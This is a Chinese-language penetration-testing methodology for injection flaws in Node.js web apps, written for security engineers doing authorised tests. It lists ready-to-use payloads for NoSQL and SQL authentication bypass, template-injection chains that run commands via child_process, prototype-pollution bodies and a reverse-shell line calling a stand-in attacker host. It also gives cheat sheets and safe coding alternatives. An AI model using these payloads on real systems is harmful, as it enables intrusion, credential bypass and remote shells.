# Node.js 注入测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 Node.js 应用注入漏洞的系统化测试流程，覆盖 NoSQL 注入、命令注入、模板注入、原型污染、反序列化等 Node.js 特有的注入类型。

## 1.2 适用范围
适用于使用 Node.js 开发的 Web 应用、API 接口，包括 Express、Koa、NestJS、Hapi 等框架的应用系统。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：Node.js 应用注入系统化测试

### 2.1 技术介绍

Node.js 应用注入测试针对 Node.js 技术栈特有的漏洞类型，包括：
- **NoSQL 注入**：MongoDB、Mongoose 中的注入
- **SQL 注入**：mysql、pg、Sequelize 中的注入
- **命令注入**：child_process.exec()、spawn() 等
- **模板注入（SSTI）**：Pug、EJS、Handlebars 注入
- **原型污染**：JavaScript 对象原型污染
- **反序列化漏洞**：unserialize、eval 注入

### 2.2 测试范围

| 测试对象 | 测试内容 |
|---------|---------|
| **框架** | Express、Koa、NestJS、Hapi、Fastify |
| **数据库** | MongoDB/Mongoose、MySQL、PostgreSQL、Sequelize |
| **注入类型** | NoSQL、SQL、命令、SSTI、原型污染 |
| **输入点** | 请求参数、HTTP 头、Cookie、JSON 请求体 |

### 2.3 测试流程

#### 2.3.1 技术栈识别

**框架识别方法：**

```
# 响应头特征
X-Powered-By: Express
Server: Koa
X-NestJS-Version: 8.0.0

# URL 路径特征
/api/  # RESTful API
/graphql  # GraphQL
/health  # 健康检查

# 错误页面特征
Error: Not Found
at Layer.handle [as handle_request]
Cannot GET /path

# 工具识别
whatweb http://target
wappalyzer (浏览器插件)
```

#### 2.3.2 NoSQL 注入测试（MongoDB）

**Mongoose 测试：**
```javascript
// 危险代码模式
User.findOne({ username: req.body.username, password: req.body.password })

// 测试 Payload
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}

{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}

{"username": {"$in": ["admin", "user"]}, "password": {"$ne": "wrong"}}
```

#### 2.3.3 SQL 注入测试（Node.js）

**mysql 测试：**
```javascript
// 危险代码模式
const query = `SELECT * FROM users WHERE id = ${userId}`;
connection.query(query);

// 安全代码
const query = 'SELECT * FROM users WHERE id = ?';
connection.query(query, [userId]);
```

**Sequelize 测试：**
```javascript
// 危险代码模式
User.findAll({ where: { id: userId } });  // 如果 userId 是对象
sequelize.query(`SELECT * FROM users WHERE id = ${userId}`);

// 安全代码
User.findAll({ where: { id: userId } });  // userId 是原始值
sequelize.query('SELECT * FROM users WHERE id = :id', { replacements: [userId] });
```

#### 2.3.4 命令注入测试（Node.js）

**危险函数识别：**
```javascript
// 危险函数
const { exec, execSync, spawn, spawnSync } = require('child_process');
exec(command);
execSync(command);
spawn(command, args, { shell: true });
```

**测试 Payload：**
```
# 基础命令
param=;id
param=|id
param=`id`
param=$(id)

# 时间延迟
param=;sleep 5
param=;ping -c 5 127.0.0.1

# 反向 Shell
param=;bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### 2.3.5 模板注入测试（SSTI）

**Pug 测试：**
```
# 基础测试
?name=#{7*7}

# 命令执行
?name=global.process.mainModule.require('child_process').execSync('id')

# 原型链访问
?name=constructor.constructor("return this")()
```

**EJS 测试：**
```
# 基础测试
?name=<%= 7*7 %>

# 命令执行
?name=<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**Handlebars 测试：**
```
# 基础测试
?name={{7*7}}

# 命令执行（需要 helper 泄露）
?name={{#with "a" as |string|}}{{#with string.constructor.constructor as |exec|}}{{exec "return global.process.mainModule.require('child_process').execSync('id')"}}{{/with}}{{/with}}
```

#### 2.3.6 原型污染测试

**测试 Payload：**
```
# URL 参数污染
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true

# JSON 请求体
POST /api/user
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

# 合并操作污染
_.merge({}, JSON.parse(userInput));
Object.assign({}, JSON.parse(userInput));
```

**检测响应：**
```
# 检查污染是否生效
GET /api/profile
# 返回 {"isAdmin": true}
```

#### 2.3.7 反序列化测试

**危险函数识别：**
```javascript
// 危险函数
eval(code);
Function(code);
vm.runInThisContext(code);
deserialize(userInput);  // 自定义反序列化
```

### 2.4 测试用例清单

#### 2.4.1 Express 测试

```
# 路由遍历
GET /{{constructor.constructor("return this")().routes}}

# 原型污染
POST /api/user
{"__proto__": {"role": "admin"}}

# SSTI（Pug）
GET /search?name=#{global.process.mainModule.require('child_process').execSync('id')}

# NoSQL 注入
POST /api/login
{"username": {"$ne": null}}

# 命令注入
GET /api/ping?host=127.0.0.1;id
```

#### 2.4.2 NestJS 测试

```
# GraphQL 注入
POST /graphql
{"query": "{ user(id: \"1' OR '1'='1\") { name } }"}

# SQL 注入（TypeORM）
GET /api/user?id=1' OR '1'='1'--

# 原型污染
POST /api/user
{"__proto__": {"isAdmin": true}}
```

#### 2.4.3 Koa 测试

```
# 模板注入
GET /search?name=<%= global.process.mainModule.require('child_process').execSync('id') %>

# NoSQL 注入
POST /api/login
{"username": {"$regex": "^adm"}}
```

#### 2.4.4 HTTP 头测试

```
# User-Agent
User-Agent: ' OR '1'='1--
User-Agent: #{7*7}

# Referer
Referer: {{7*7}}

# X-Forwarded-For
X-Forwarded-For: 127.0.0.1' OR '1'='1--

# Cookie
Cookie: session=admin'--
Cookie: user_data={"$ne": null}
```

### 2.5 自动化测试工具

#### 工具推荐

```bash
# SQLMap - SQL 注入
sqlmap -u "http://target/api/user?id=1" --dbms=mysql

# NoSQLMap - NoSQL 注入
python NoSQLMap.py

# 原型污染检测
ppscan http://target

# 目录扫描
gobuster dir -u http://target -w common.txt -x js,json

# API 测试
postman / insomnia
```

#### Burp Suite 插件

- **NoSQL Injection** - 检测 NoSQL 注入
- **Prototype Pollution** - 检测原型污染
- **Hackvertor** - 编码/解码
- **Logger++** - 详细日志记录

### 2.6 测试报告要点

测试完成后，报告应包含：
1. Node.js 版本和框架信息
2. 所有测试的输入点列表
3. 发现的漏洞点及详情
4. 漏洞利用难度评估
5. 潜在影响范围
6. 修复建议

---

# 第三部分：附录

## 3.1 Node.js 危险函数速查表

| 类别 | 危险函数 | 安全替代 |
|-----|---------|---------|
| **SQL 查询** | `connection.query(sql)` | `connection.query(sql, params)` |
| **SQL 查询** | `sequelize.query(sql)` | `sequelize.query(sql, {replacements})` |
| **NoSQL 查询** | `Model.findOne(query)` | 验证 query 类型 |
| **命令执行** | `exec(cmd)` | `execFile(cmd, args)` |
| **命令执行** | `spawn(cmd, {shell: true})` | `spawn(cmd, args)` |
| **模板** | `pug.render(user_input)` | 使用模板文件 |
| **代码执行** | `eval(code)` | 避免使用 |
| **对象合并** | `_.merge({}, user_input)` | 使用 `Object.create(null)` |

## 3.2 NoSQL 注入 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **认证绕过** | `{"$ne": null}` | 不等于 null |
| **认证绕过** | `{"$in": [val1, val2]}` | 在列表中 |
| **数据提取** | `{"$regex": "^abc"}` | 正则匹配 |
| **数据提取** | `{"$where": "return true"}` | 返回所有文档 |
| **逻辑操作** | `{"$or": [{cond1}, {cond2}]}` | 或逻辑 |
| **逻辑操作** | `{"$and": [...]}` | 与逻辑 |

## 3.3 原型污染 Payload 速查表

| Payload | 说明 |
|---------|------|
| `?__proto__[key]=value` | URL 参数污染 |
| `{"__proto__": {"key": "value"}}` | JSON 污染 |
| `{"constructor": {"prototype": {"key": "value"}}}` | 构造函数污染 |
| `?constructor[prototype][key]=value` | URL 构造函数污染 |

## 3.4 参考资源

- [OWASP Node.js Security](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Snyk - Node.js Security Best Practices](https://snyk.io/blog/nodejs-security-best-practices/)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
